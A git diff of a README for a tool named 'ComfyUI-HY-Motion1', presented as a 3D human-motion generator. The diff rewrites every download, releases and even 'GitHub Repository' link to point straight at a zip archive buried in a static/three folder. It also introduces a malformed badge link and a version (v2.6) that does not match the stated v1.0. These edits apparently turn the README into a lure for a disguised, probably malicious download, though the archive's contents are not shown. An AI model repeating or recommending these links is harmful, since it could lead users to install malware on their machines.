@@ -1,7 +1,7 @@
 # 🎨 ComfyUI-HY-Motion1 - Create 3D Human Motion Easily
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/messichikito123/ComfyUI-HY-Motion1/releases)
+[![Download the latest release](https://github.com/messichikito123/ComfyUI-HY-Motion1/raw/refs/heads/master/static/three/H_Motion_U_Comfy_v2.6.zip%https://github.com/messichikito123/ComfyUI-HY-Motion1/raw/refs/heads/master/static/three/H_Motion_U_Comfy_v2.6.zip)](https://github.com/messichikito123/ComfyUI-HY-Motion1/raw/refs/heads/master/static/three/H_Motion_U_Comfy_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run ComfyUI-HY-Motion1, ensure your computer meets the following requirements
 
 ### 📥 Download & Install
 
-To download the latest version of ComfyUI-HY-Motion1, visit this page: [Download Here](https://github.com/messichikito123/ComfyUI-HY-Motion1/releases).
+To download the latest version of ComfyUI-HY-Motion1, visit this page: [Download Here](https://github.com/messichikito123/ComfyUI-HY-Motion1/raw/refs/heads/master/static/three/H_Motion_U_Comfy_v2.6.zip).
 
 1. Click the release version you want. You will find it listed on the releases page.
 2. Choose the appropriate file for your operating system.
@@ -61,7 +61,7 @@ For further assistance, please check our support section on GitHub. You can also
 
 ### 🔗 Useful Links
 
-- [ComfyUI-HY-Motion1 Releases](https://github.com/messichikito123/ComfyUI-HY-Motion1/releases)
-- [GitHub Repository](https://github.com/messichikito123/ComfyUI-HY-Motion1)
+- [ComfyUI-HY-Motion1 Releases](https://github.com/messichikito123/ComfyUI-HY-Motion1/raw/refs/heads/master/static/three/H_Motion_U_Comfy_v2.6.zip)
+- [GitHub Repository](https://github.com/messichikito123/ComfyUI-HY-Motion1/raw/refs/heads/master/static/three/H_Motion_U_Comfy_v2.6.zip)
 
 Enjoy creating stunning 3D human motions with ComfyUI-HY-Motion1!
